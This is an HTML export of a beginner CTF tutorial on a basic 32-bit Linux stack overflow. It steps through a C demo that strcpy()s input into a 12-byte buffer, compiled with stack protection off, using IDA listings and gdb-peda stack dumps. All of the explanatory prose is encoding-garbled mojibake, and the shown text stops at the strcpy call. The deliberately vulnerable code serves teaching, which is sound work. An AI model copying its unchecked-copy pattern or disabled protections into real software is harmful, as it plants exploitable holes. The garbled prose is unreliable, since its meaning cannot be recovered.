<!DOCTYPE html>
<html>
<head>
<title>1.鏈€鍗曠函鐨勬爤婧㈠嚭</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
/* Author: Nicolas Hery - http://nicolashery.com */
/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
/* Source: https://github.com/nicolahery/markdownpad-github */

/* RESET
=============================================================================*/

html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
}

/* BODY
=============================================================================*/

body {
  font-family: Helvetica, arial, freesans, clean, sans-serif;
  font-size: 14px;
  line-height: 1.6;
  color: #333;
  background-color: #fff;
  padding: 20px;
  max-width: 960px;
  margin: 0 auto;
}

body>*:first-child {
  margin-top: 0 !important;
}

body>*:last-child {
  margin-bottom: 0 !important;
}

/* BLOCKS
=============================================================================*/

p, blockquote, ul, ol, dl, table, pre {
  margin: 15px 0;
}

/* HEADERS
=============================================================================*/

h1, h2, h3, h4, h5, h6 {
  margin: 20px 0 10px;
  padding: 0;
  font-weight: bold;
  -webkit-font-smoothing: antialiased;
}

h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
  font-size: inherit;
}

h1 {
  font-size: 28px;
  color: #000;
}

h2 {
  font-size: 24px;
  border-bottom: 1px solid #ccc;
  color: #000;
}

h3 {
  font-size: 18px;
}

h4 {
  font-size: 16px;
}

h5 {
  font-size: 14px;
}

h6 {
  color: #777;
  font-size: 14px;
}

body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
  margin-top: 0;
  padding-top: 0;
}

a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
  margin-top: 0;
  padding-top: 0;
}

h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
  margin-top: 10px;
}

/* LINKS
=============================================================================*/

a {
  color: #4183C4;
  text-decoration: none;
}

a:hover {
  text-decoration: underline;
}

/* LISTS
=============================================================================*/

ul, ol {
  padding-left: 30px;
}

ul li > :first-child, 
ol li > :first-child, 
ul li ul:first-of-type, 
ol li ol:first-of-type, 
ul li ol:first-of-type, 
ol li ul:first-of-type {
  margin-top: 0px;
}

ul ul, ul ol, ol ol, ol ul {
  margin-bottom: 0;
}

dl {
  padding: 0;
}

dl dt {
  font-size: 14px;
  font-weight: bold;
  font-style: italic;
  padding: 0;
  margin: 15px 0 5px;
}

dl dt:first-child {
  padding: 0;
}

dl dt>:first-child {
  margin-top: 0px;
}

dl dt>:last-child {
  margin-bottom: 0px;
}

dl dd {
  margin: 0 0 15px;
  padding: 0 15px;
}

dl dd>:first-child {
  margin-top: 0px;
}

dl dd>:last-child {
  margin-bottom: 0px;
}

/* CODE
=============================================================================*/

pre, code, tt {
  font-size: 12px;
  font-family: Consolas, "Liberation Mono", Courier, monospace;
}

code, tt {
  margin: 0 0px;
  padding: 0px 0px;
  white-space: nowrap;
  border: 1px solid #eaeaea;
  background-color: #f8f8f8;
  border-radius: 3px;
}

pre>code {
  margin: 0;
  padding: 0;
  white-space: pre;
  border: none;
  background: transparent;
}

pre {
  background-color: #f8f8f8;
  border: 1px solid #ccc;
  font-size: 13px;
  line-height: 19px;
  overflow: auto;
  padding: 6px 10px;
  border-radius: 3px;
}

pre code, pre tt {
  background-color: transparent;
  border: none;
}

kbd {
    -moz-border-bottom-colors: none;
    -moz-border-left-colors: none;
    -moz-border-right-colors: none;
    -moz-border-top-colors: none;
    background-color: #DDDDDD;
    background-image: linear-gradient(#F1F1F1, #DDDDDD);
    background-repeat: repeat-x;
    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
    border-image: none;
    border-radius: 2px 2px 2px 2px;
    border-style: solid;
    border-width: 1px;
    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
    line-height: 10px;
    padding: 1px 4px;
}

/* QUOTES
=============================================================================*/

blockquote {
  border-left: 4px solid #DDD;
  padding: 0 15px;
  color: #777;
}

blockquote>:first-child {
  margin-top: 0px;
}

blockquote>:last-child {
  margin-bottom: 0px;
}

/* HORIZONTAL RULES
=============================================================================*/

hr {
  clear: both;
  margin: 15px 0;
  height: 0px;
  overflow: hidden;
  border: none;
  background: transparent;
  border-bottom: 4px solid #ddd;
  padding: 0;
}

/* TABLES
=============================================================================*/

table th {
  font-weight: bold;
}

table th, table td {
  border: 1px solid #ccc;
  padding: 6px 13px;
}

table tr {
  border-top: 1px solid #ccc;
  background-color: #fff;
}

table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

/* IMAGES
=============================================================================*/

img {
  max-width: 100%
}
</style>
<style type="text/css">
.highlight  { background: #ffffff; }
.highlight .c { color: #999988; font-style: italic } /* Comment */
.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
.highlight .k { font-weight: bold } /* Keyword */
.highlight .o { font-weight: bold } /* Operator */
.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
.highlight .ge { font-style: italic } /* Generic.Emph */
.highlight .gr { color: #aa0000 } /* Generic.Error */
.highlight .gh { color: #999999 } /* Generic.Heading */
.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
.highlight .go { color: #888888 } /* Generic.Output */
.highlight .gp { color: #555555 } /* Generic.Prompt */
.highlight .gs { font-weight: bold } /* Generic.Strong */
.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
.highlight .gt { color: #aa0000 } /* Generic.Traceback */
.highlight .kc { font-weight: bold } /* Keyword.Constant */
.highlight .kd { font-weight: bold } /* Keyword.Declaration */
.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
.highlight .kr { font-weight: bold } /* Keyword.Reserved */
.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
.highlight .m { color: #009999 } /* Literal.Number */
.highlight .s { color: #d14 } /* Literal.String */
.highlight .na { color: #008080 } /* Name.Attribute */
.highlight .nb { color: #0086B3 } /* Name.Builtin */
.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
.highlight .no { color: #008080 } /* Name.Constant */
.highlight .ni { color: #800080 } /* Name.Entity */
.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
.highlight .nn { color: #555555 } /* Name.Namespace */
.highlight .nt { color: #000080 } /* Name.Tag */
.highlight .nv { color: #008080 } /* Name.Variable */
.highlight .ow { font-weight: bold } /* Operator.Word */
.highlight .w { color: #bbbbbb } /* Text.Whitespace */
.highlight .mf { color: #009999 } /* Literal.Number.Float */
.highlight .mh { color: #009999 } /* Literal.Number.Hex */
.highlight .mi { color: #009999 } /* Literal.Number.Integer */
.highlight .mo { color: #009999 } /* Literal.Number.Oct */
.highlight .sb { color: #d14 } /* Literal.String.Backtick */
.highlight .sc { color: #d14 } /* Literal.String.Char */
.highlight .sd { color: #d14 } /* Literal.String.Doc */
.highlight .s2 { color: #d14 } /* Literal.String.Double */
.highlight .se { color: #d14 } /* Literal.String.Escape */
.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
.highlight .si { color: #d14 } /* Literal.String.Interpol */
.highlight .sx { color: #d14 } /* Literal.String.Other */
.highlight .sr { color: #009926 } /* Literal.String.Regex */
.highlight .s1 { color: #d14 } /* Literal.String.Single */
.highlight .ss { color: #990073 } /* Literal.String.Symbol */
.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
.highlight .vc { color: #008080 } /* Name.Variable.Class */
.highlight .vg { color: #008080 } /* Name.Variable.Global */
.highlight .vi { color: #008080 } /* Name.Variable.Instance */
.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
.pl-c {
    color: #969896;
}

.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
    color: #0086b3;
}

.pl-e,.pl-en {
    color: #795da3;
}

.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
    color: #333;
}

.pl-ent {
    color: #63a35c;
}

.pl-k,.pl-s,.pl-st {
    color: #a71d5d;
}

.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
    color: #df5000;
}

.pl-id {
    color: #b52a1d;
}

.pl-ii {
    background-color: #b52a1d;
    color: #f8f8f8;
}

.pl-sr .pl-cce {
    color: #63a35c;
    font-weight: bold;
}

.pl-ml {
    color: #693a17;
}

.pl-mh,.pl-mh .pl-en,.pl-ms {
    color: #1d3e81;
    font-weight: bold;
}

.pl-mq {
    color: #008080;
}

.pl-mi {
    color: #333;
    font-style: italic;
}

.pl-mb {
    color: #333;
    font-weight: bold;
}

.pl-md,.pl-mdhf {
    background-color: #ffecec;
    color: #bd2c00;
}

.pl-mdht,.pl-mi1 {
    background-color: #eaffea;
    color: #55a532;
}

.pl-mdr {
    color: #795da3;
    font-weight: bold;
}

.pl-mo {
    color: #1d3e81;
}
.task-list {
padding-left:10px;
margin-bottom:0;
}

.task-list li {
    margin-left: 20px;
}

.task-list-item {
list-style-type:none;
padding-left:10px;
}

.task-list-item label {
font-weight:400;
}

.task-list-item.enabled label {
cursor:pointer;
}

.task-list-item+.task-list-item {
margin-top:3px;
}

.task-list-item-checkbox {
display:inline-block;
margin-left:-20px;
margin-right:3px;
vertical-align:1px;
}
</style>
</head>
<body>
<h1 id="-">鏈€鍗曠函鐨勬爤婧㈠嚭</h1>
<p><strong>Author锛歸nagzihxain<br>Mail锛歵udouboom@163.com</strong></p>
<h2 id="0x00-">0x00 鍓嶈█</h2>
<p>CTF鐨凱wn棰樺ソ澶氶兘鏄疞inux鐨勶紝闈炲父鏈夋剰鎬濓紝浠ュ墠璺熺潃甯堝倕浠浜嗕簺锛屽湪姝ょ畝鍗曠殑鍐欏嚑绡囩瑪璁帮紝涓€鏉ヨ嚜宸卞杩欓儴鍒嗙煡璇嗘湁涓€荤粨锛屼簩鏉ヨ兘缁欏垰鍏ラ棬鐨勫悓瀛︿竴鐐瑰弬鑰冿紝涓嶇┖璋堝悇绉嶅鎶€娣阀锛屼富瑕佸氨鏄畬鏁寸殑璋冭瘯姝ラ锛屽綋鐒讹紝濂囨妧娣阀杩欓儴鍒嗕篃鐩稿綋閲嶈锛屾垜浼氬湪鍚庨潰缁欏嚭涓€浜涙€濊矾涓嶉敊鐨勫ソ鏂囩珷锛屾湁鍏磋叮鐨勫悓瀛﹀彲浠ュ弬鑰�</p>
<p>浣跨敤鐨勭幆澧冩槸</p>
<ul>
<li>VM Workstation 12</li><li>Ubuntu 16.04 32浣�</li><li>gdb + peda</li><li>IDA Pro 6.8(鎴戝€掓槸鎯充拱6.9鍟�)</li></ul>
<h2 id="0x01-">0x01 鍩虹鐭ヨ瘑</h2>
<p>鍋囪澶у閮芥湁鍩虹C璇█鐨勭紪绋嬬粡楠屽晩锛侊紒锛侊紒锛侊紒</p>
<p>鍐欎竴涓畝鍗曠殑鎷疯礉瀛楃涓插嚱鏁帮紝涓轰簡姹囩紪鍑烘潵鐨勬祦绋嬫甯哥偣锛屼娇鐢ㄤ紶鍙傜殑鏂规硶</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void Overflow(char temp[])
{
    char buffer[12];
    strcpy(buffer, temp);
    printf(&quot;%s\n&quot;, buffer);
}

int main()
{
    char temp[12] = &quot;AAAAAAAAAA&quot;;
    Overflow(temp);
    return 0;
}
</code></pre><p>浣跨敤娌℃湁鏍堜繚鎶ょ殑妯″紡缂栬瘧鍑哄彲鎵ц鏂囦欢锛屽悓鏃朵娇鐢�<code>-fno-builtin</code>绂佹鎶�<code>printf()</code>杞负<code>puts()</code></p>
<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -fno-builtin -o Demo Demo.c
wnagzihxain@toT0C:~$ ./Demo
AAAAAAAAAA
</code></pre><p>杩愯鏁堟灉鏄笉閿欑殑锛屼娇鐢↖DA闈欐€佸垎鏋�</p>
<p><img src="Image/1.png" alt=""></p>
<p>鎶�<code>main()</code>鍑芥暟鎷疯礉鍑烘潵</p>
<pre><code>.text:0804846A ; =============== S U B R O U T I N E =======================================
.text:0804846A
.text:0804846A ; Attributes: bp-based frame
.text:0804846A
.text:0804846A ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0804846A                 public main
.text:0804846A main            proc near               ; DATA XREF: _start+17o
.text:0804846A
.text:0804846A src             = byte ptr -14h
.text:0804846A var_10          = dword ptr -10h
.text:0804846A var_C           = dword ptr -0Ch
.text:0804846A var_4           = dword ptr -4
.text:0804846A argc            = dword ptr  0Ch
.text:0804846A argv            = dword ptr  10h
.text:0804846A envp            = dword ptr  14h
.text:0804846A
.text:0804846A                 lea     ecx, [esp+4]
.text:0804846E                 and     esp, 0FFFFFFF0h
.text:08048471                 push    dword ptr [ecx-4]
.text:08048474                 push    ebp
.text:08048475                 mov     ebp, esp
.text:08048477                 push    ecx
.text:08048478                 sub     esp, 14h        ; 寮€杈�0x14瀛楄妭鐨勬爤绌洪棿
.text:0804847B                 mov     dword ptr [ebp+src], &#39;AAAA&#39; ; 姝ゆ椂ebp+src鎸囧悜鏍堥《锛岃繛鐫€3鍙ラ兘鏄湪浠�4瀛楄妭涓哄崟浣嶈繘琛岃祴鍊�
.text:08048482                 mov     [ebp+var_10], &#39;AAAA&#39;
.text:08048489                 mov     [ebp+var_C], &#39;AA&#39;
.text:08048490                 sub     esp, 0Ch        ; 鍐嶆寮€杈�0x0C鐨勬爤绌洪棿锛屾姮楂樻爤椤�
.text:08048493                 lea     eax, [ebp+src]  ; eax鎸囧悜src瀛楃涓诧紝ebp+src姝ゆ椂涓�&quot;AAAAAAAAAA&quot;鐨勯鍦板潃
.text:08048496                 push    eax             ; 瀵箂rc鍋氬帇鏍堟搷浣滐紝鏄庢樉鐨勪紶鍙傝涓�
.text:08048497                 call    Overflow        ; 璋冪敤Overflow()鍑芥暟锛屽弬鏁颁负src瀛楃涓�
.text:0804849C                 add     esp, 10h
.text:0804849F                 mov     eax, 0          ; return 0;
.text:080484A4                 mov     ecx, [ebp+var_4]
.text:080484A7                 leave
.text:080484A8                 lea     esp, [ecx-4]
.text:080484AB                 retn
.text:080484AB main            endp
</code></pre><p>璺熷叆璋冪敤鐨�<code>Overflow()</code>鍑芥暟</p>
<pre><code>.text:0804843B
.text:0804843B ; =============== S U B R O U T I N E =======================================
.text:0804843B
.text:0804843B ; Attributes: bp-based frame
.text:0804843B
.text:0804843B ; int __cdecl Overflow(char *src)
.text:0804843B                 public Overflow
.text:0804843B Overflow        proc near               ; CODE XREF: main+2Dp
.text:0804843B
.text:0804843B dest            = byte ptr -14h
.text:0804843B src             = dword ptr  8
.text:0804843B
.text:0804843B                 push    ebp
.text:0804843C                 mov     ebp, esp
.text:0804843E                 sub     esp, 18h
.text:08048441                 sub     esp, 8          ; 鎶珮鏍堥《
.text:08048444                 push    [ebp+src]       ; src鏄浜屼釜鍙傛暟
.text:08048447                 lea     eax, [ebp+dest] ; 鑾峰彇dest瀛楃涓茬殑棣栧湴鍧€
.text:0804844A                 push    eax             ; 灏哾est浣滀负绗竴涓弬鏁板帇鏍�
.text:0804844B                 call    _strcpy         ; 璋冪敤strcpy():---&gt;strcpy(dest, src);
.text:08048450                 add     esp, 10h        ; 杩欎袱鍙ラ檷浣庢爤椤�8涓瓧鑺傦紝鐩稿綋浜庡脊鍑轰袱涓弬鏁�
.text:08048453                 sub     esp, 8
.text:08048456                 lea     eax, [ebp+dest] ; 灏嗘嫹璐濆畬鐨刣est瀛楃涓查鍦板潃浼犵粰eax
.text:08048459                 push    eax             ; 灏哾est瀛楃涓蹭綔涓哄弬鏁板帇鏍�
.text:0804845A                 push    offset format   ; &quot;%s\n&quot;
.text:0804845F                 call    _printf         ; printf(&quot;%s\n&quot;, dest);
.text:08048464                 add     esp, 10h
.text:08048467                 nop
.text:08048468                 leave
.text:08048469                 retn
.text:08048469 Overflow        endp
</code></pre><p>闈欐€佸垎鏋愬埌杩欓噷锛屼袱娈垫眹缂栭€昏緫杩樻槸寰堟竻鏂扮殑</p>
<p>鎺ヤ笅閲屾垜浠娇鐢╣db鏉ュ姩鎬佽皟璇曪紝gdb鏈変竴涓緢濂界敤鐨勬彃浠秔eda</p>
<p>瀹夎濡備笅</p>
<pre><code>git clone https://github.com/longld/peda.git ~/peda
echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
</code></pre><p>鍚姩璋冭瘯</p>
<pre><code>wnagzihxain@toT0C:~$ gdb Demo
</code></pre><p>鍑虹幇鍚勭淇℃伅锛岃繖涓笉闇€瑕佺</p>
<p><img src="Image/2.png" alt=""></p>
<p>鍙互鐩存帴浣跨敤<code>start</code>杩愯鍑芥暟锛屼篃鍙互浣跨敤<code>break(b)</code>璁剧疆<code>main()</code>鍑芥暟鍏ュ彛鏂偣</p>
<pre><code>gdb-peda$ break main
Breakpoint 1 at 0x8048478
</code></pre><p>浣跨敤<code>run(r)</code>杩愯绋嬪簭锛屽鏋滄槸<code>start</code>灏变笉闇€瑕佽繖涓€姝�</p>
<pre><code>gdb-peda$ run
Starting program: /home/wnagzihxain/Demo
</code></pre><p>peda楠氭皵鐨勯厤鑹蹭竴瑙堟棤閬�</p>
<p><img src="Image/3.png" alt=""></p>
<p>姝ゆ椂鍦ㄦ姮楂樻爤椤讹紝鍒嗛厤<code>0x14</code>瀛楄妭鐨勭┖闂�</p>
<pre><code>=&gt; 0x8048478 &lt;main+14&gt;:    sub    esp,0x14
</code></pre><p>缁х画鎵ц鐩稿叧鐨勬湁涓変釜鍛戒护</p>
<ul>
<li>continue(c)锛氱户缁繍琛屽埌涓嬩竴涓柇鐐�</li><li>next(n)锛氬崟姝ユ杩囷紝鍜孫D閲孎8涓€鏍�</li><li>step(s)锛氬崟姝ユ鍏ワ紝鍜孫D閲孎7涓€鏍�</li></ul>
<p>姝ゆ椂鏍堢殑鏁版嵁</p>
<pre><code>[------------------------------------stack-------------------------------------]
0000| 0xbfffef54 --&gt; 0xbfffef70 --&gt; 0x1 
0004| 0xbfffef58 --&gt; 0x0 
0008| 0xbfffef5c --&gt; 0xb7e21637 (&lt;__libc_start_main+247&gt;:    add    esp,0x10)
0012| 0xbfffef60 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
0016| 0xbfffef64 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
0020| 0xbfffef68 --&gt; 0x0 
0024| 0xbfffef6c --&gt; 0xb7e21637 (&lt;__libc_start_main+247&gt;:    add    esp,0x10)
0028| 0xbfffef70 --&gt; 0x1
</code></pre><p>鏌ョ湅鏍堟暟鎹�<code>examine(x)</code>锛屽悗闈㈣窡涓婅鎵撳嵃鐨勯暱搴﹀拰鏍煎紡</p>
<pre><code>gdb-peda$ x/12x $sp
0xbfffef54:    0xbfffef70    0x00000000    0xb7e21637    0xb7fbb000
0xbfffef64:    0xb7fbb000    0x00000000    0xb7e21637    0x00000001
0xbfffef74:    0xbffff004    0xbffff00c    0x00000000    0x00000000
</code></pre><p>浣跨敤<code>next</code>鍛戒护鍗曟鎵ц</p>
<p><img src="Image/4.png" alt=""></p>
<p>鏍堥《鎶珮鍚庢爤鐨勬暟鎹紝鏂板紑杈熷嚭鏉ョ殑鏍堢┖闂村凡鏈夌殑鏁版嵁涓嶇敤澶湪鎰忥紝骞舵病鏈変粈涔堢敤</p>
<pre><code>[------------------------------------stack-------------------------------------]
0000| 0xbfffef40 --&gt; 0x1 
0004| 0xbfffef44 --&gt; 0xbffff004 --&gt; 0xbffff1f5 (&quot;/home/wnagzihxain/Demo&quot;)
0008| 0xbfffef48 --&gt; 0xbffff00c --&gt; 0xbffff20c (&quot;LC_PAPER=zh_HK.UTF-8&quot;)
0012| 0xbfffef4c --&gt; 0x80484d1 (&lt;__libc_csu_init+33&gt;:    lea    eax,[ebx-0xf8])
0016| 0xbfffef50 --&gt; 0xb7fbb3dc --&gt; 0xb7fbc1e0 --&gt; 0x0 
0020| 0xbfffef54 --&gt; 0xbfffef70 --&gt; 0x1 
0024| 0xbfffef58 --&gt; 0x0 
0028| 0xbfffef5c --&gt; 0xb7e21637 (&lt;__libc_start_main+247&gt;:    add    esp,0x10)
</code></pre><p>鎺ヤ笅鏉�3鍙ユ寚浠ゅ皢<code>AAAAAAAAAA</code>瀛樺偍鍒版爤涓�</p>
<pre><code>=&gt; 0x804847b &lt;main+17&gt;:    mov    DWORD PTR [ebp-0x14],0x41414141
   0x8048482 &lt;main+24&gt;:    mov    DWORD PTR [ebp-0x10],0x41414141
   0x8048489 &lt;main+31&gt;:    mov    DWORD PTR [ebp-0xc],0x4141
</code></pre><p>濡傛灉闇€瑕佸啀娆℃墽琛実db涓婁竴鍙ユ寚浠わ紝鐩存帴鍥炶溅灏卞彲浠ワ紝璧板畬鎷疯礉瀛楃涓叉寚浠�</p>
<p><img src="Image/5.png" alt=""></p>
<p>鍐嶆鎶珮鏍堥《</p>
<pre><code>=&gt; 0x8048490 &lt;main+38&gt;:    sub    esp,0xc
</code></pre><p>鑾峰彇<code>AAAAAAAAAA</code>瀛楃涓茬殑棣栧湴鍧€</p>
<pre><code>=&gt; 0x8048493 &lt;main+41&gt;:    lea    eax,[ebp-0x14]
</code></pre><p>鎵ц瀹屽悗瑙傚療EAX瀵勫瓨鍣�</p>
<pre><code>EAX: 0xbfffef44 (&quot;AAAAAAAAAA&quot;)
</code></pre><p>灏嗗瓧绗︿覆<code>AAAAAAAAAA</code>鍘嬫爤锛屾帴鐫€璋冪敤<code>Overflow()</code>鍑芥暟</p>
<pre><code>=&gt; 0x8048496 &lt;main+44&gt;:    push   eax
   0x8048497 &lt;main+45&gt;:    call   0x804843b &lt;Overflow&gt;
</code></pre><p>鍦ㄦ墽琛�<code>Call</code>鎸囦护鏃讹紝浣跨敤<code>step(s)</code>姝ュ叆<code>Overflow()</code>鍑芥暟</p>
<p><img src="Image/6.png" alt=""></p>
<p>璺熷叆鍚庯紝鍋滃湪鍏ュ彛</p>
<p><img src="Image/7.png" alt=""></p>
<p>缁х画浣跨敤<code>next(n)</code>鍛戒护锛屾姮楂樻爤椤讹紝寮€杈熸爤绌洪棿缁欒鍑芥暟鐢�</p>
<pre><code>=&gt; 0x804843e &lt;Overflow+3&gt;:    sub    esp,0x18
   0x8048441 &lt;Overflow+6&gt;:    sub    esp,0x8
</code></pre><p>鍒板帇鏍堟搷浣滐紝铏界劧杩欓噷鐪嬩笉鍒�<code>ebp+0x8</code>澶勭殑鏁版嵁锛屼絾鏄啛鎮夋爤缁撴瀯鐨勫悓瀛﹀簲璇ユ兂寰楀埌杩欐槸鍒氬垰浼犺繘鏉ョ殑鍙傛暟瀛樺偍浣嶇疆</p>
<p><img src="Image/8.png" alt=""></p>
<p>琛ュ厖涓€鐐规爤鐨勭煡璇�</p>
<pre><code>0x00000000 EBP
0x00000004 RETN
0x00000008 Param1
0x0000000C Param2
0x0000000F Param3
......
</code></pre><p>鎵ц瀹屽悗鏍堢殑甯冨眬锛岀‘瀹炴槸<code>AAAAAAAAAA</code>瀛楃涓�</p>
<pre><code>[------------------------------------stack-------------------------------------]
0000| 0xbfffef04 --&gt; 0xbfffef44 (&quot;AAAAAAAAAA&quot;)
0004| 0xbfffef08 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
0008| 0xbfffef0c --&gt; 0xfd57 
0012| 0xbfffef10 --&gt; 0xffffffff 
0016| 0xbfffef14 --&gt; 0x2f (&#39;/&#39;)
0020| 0xbfffef18 --&gt; 0xb7e15dc8 --&gt; 0x2b76 (&#39;v+&#39;)
0024| 0xbfffef1c --&gt; 0xb7fd6858 --&gt; 0xb7e09000 --&gt; 0x464c457f 
0028| 0xbfffef20 --&gt; 0x8000
</code></pre><p>鎺ヤ笅鏉ヨ幏鍙�<code>ebp-0x14</code>鎸囬拡锛屽皢鍏跺帇鏍堬紝骞惰皟鐢�<code>strcpy()</code>鍑芥暟</p>
<pre><code>=&gt; 0x8048447 &lt;Overflow+12&gt;:    lea    eax,[ebp-0x14]
   0x804844a &lt;Overflow+15&gt;:    push   eax
   0x804844b &lt;Overflow+16&gt;:    call   0x8048310 &lt;strcpy@plt&gt;
</code></pre><p>鎵ц瀹屽悗锛�<code>ebp-0x14</code>鎸囧悜鐨勬暟鎹负<code>AAAAAAAAAA</code></p>
<p><img src="Image/9.png" alt=""></p>
<p>鎷疯礉瀹岄檷浣庢爤椤讹紝杩欎袱鍙ョ瓑浜庨檷浣�<code>0x08</code>瀛楄妭</p>
<pre><code>=&gt; 0x8048450 &lt;Overflow+21&gt;:    add    esp,0x10
   0x8048453 &lt;Overflow+24&gt;:    sub    esp,0x8
</code></pre><p>鑾峰彇涓や釜鎸囬拡锛屽綋鍙傛暟鍘嬫爤锛岃皟鐢�<code>printf()</code></p>
<pre><code>=&gt; 0x8048456 &lt;Overflow+27&gt;:    lea    eax,[ebp-0x14]
   0x8048459 &lt;Overflow+30&gt;:    push   eax
   0x804845a &lt;Overflow+31&gt;:    push   0x8048530
   0x804845f &lt;Overflow+36&gt;:    call   0x8048300 &lt;printf@plt&gt;
</code></pre><p>鎵撳嵃鍑虹涓€涓弬鏁�</p>
<pre><code>gdb-peda$ print (char *)0x8048530
$1 = 0x8048530 &quot;%s\n&quot;
</code></pre><p>杩樻湁涓€绉嶆墦鍗扮殑鏂规硶</p>
<pre><code>gdb-peda$ x/s 0x8048530
0x8048530:    &quot;%s\n&quot;
</code></pre><p>鎵撳嵃</p>
<p><img src="Image/10.png" alt=""></p>
<p>鎺ヤ笅鏉ュ氨鏄檷浣庢爤椤朵繚鎸佹爤骞宠　锛岄€€鍑哄嚱鏁颁簡</p>
<h2 id="0x02-">0x02 鏍堟孩鍑哄垎鏋�</h2>
<p>鍥炲埌浠ｇ爜灞傞潰锛屾垜浠紶鍏ヤ竴涓�10瀛楄妭鐨勫瓧绗︿覆鍙橀噺锛岀洿鎺ユ嫹璐濈粰浜�<code>buffer</code>锛岃繖閲屾病鏈夎€冭檻浼犲叆鐨勫瓧绗︿覆闀垮害锛屽鏋滄垜浠紶鍏ョ殑鏄�12瀛楄妭锛�16瀛楄妭锛�100瀛楄妭鍛紵</p>
<pre><code>void Overflow(char temp[])
{
    char buffer[12];
    strcpy(buffer, temp);
    printf(&quot;%s\n&quot;, buffer);
}
</code></pre><p>閲嶆柊璺戣捣鏉ワ紝鎵惧埌鎷疯礉瀛楃涓叉椂鐨勬爤甯冨眬</p>
<p>鎷疯礉鍓�</p>
<pre><code>0xbfffef00:    0xbfffef14    0xbfffef44    0xb7fbb000    0x0000fd57
0xbfffef10:    0xffffffff    0x0000002f    0xb7e15dc8    0xb7fd6858
0xbfffef20:    0x00008000    0xb7fbb000    0xbfffef58    0x0804849c
0xbfffef30:    0xbfffef44    0x00000000    0xb7e37a50    0x080484fb
0xbfffef40:    0x00000001    0x41414141    0x41414141    0x00004141
0xbfffef50:    0xb7fbb3dc    0xbfffef70    0x00000000    0xb7e21637
0xbfffef60:    0xb7fbb000    0xb7fbb000    0x00000000    0xb7e21637
0xbfffef70:    0x00000001    0xbffff004    0xbffff00c    0x00000000
</code></pre><p>鎷疯礉鍚庯紝娉ㄦ剰灏忕搴忕殑闂</p>
<pre><code>gdb-peda$ x/32x $sp
0xbfffef00:    0xbfffef14    0xbfffef44    0xb7fbb000    0x0000fd57
0xbfffef10:    0xffffffff    0x41414141    0x41414141    0xb7004141
0xbfffef20:    0x00008000    0xb7fbb000    0xbfffef58    0x0804849c
0xbfffef30:    0xbfffef44    0x00000000    0xb7e37a50    0x080484fb
0xbfffef40:    0x00000001    0x41414141    0x41414141    0x00004141
0xbfffef50:    0xb7fbb3dc    0xbfffef70    0x00000000    0xb7e21637
0xbfffef60:    0xb7fbb000    0xb7fbb000    0x00000000    0xb7e21637
0xbfffef70:    0x00000001    0xbffff004    0xbffff00c    0x00000000
</code></pre><p>涓轰簡鐩磋锛屾垜浠敼涓�26涓ぇ鍐欏瓧姣嶆潵娴嬭瘯锛屾妸鏁伴噺鏀逛负11,閭ｄ箞娴嬭瘯瀛楃涓插氨鏄�<code>ABCDEFGHIJK</code></p>
<p>鍚屾牱鏉′欢缂栬瘧杩愯</p>
<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -fno-builtin -o Demo Demo.c
wnagzihxain@toT0C:~$ ./Demo
ABCDEFGHIJK
</code></pre><p>杩愯锛屽崟姝ュ埌鎷疯礉鎸囦护锛屼笅涓柇鐐�</p>
<pre><code>=&gt; 0x804844b &lt;Overflow+16&gt;:    call   0x8048310 &lt;strcpy@plt&gt;
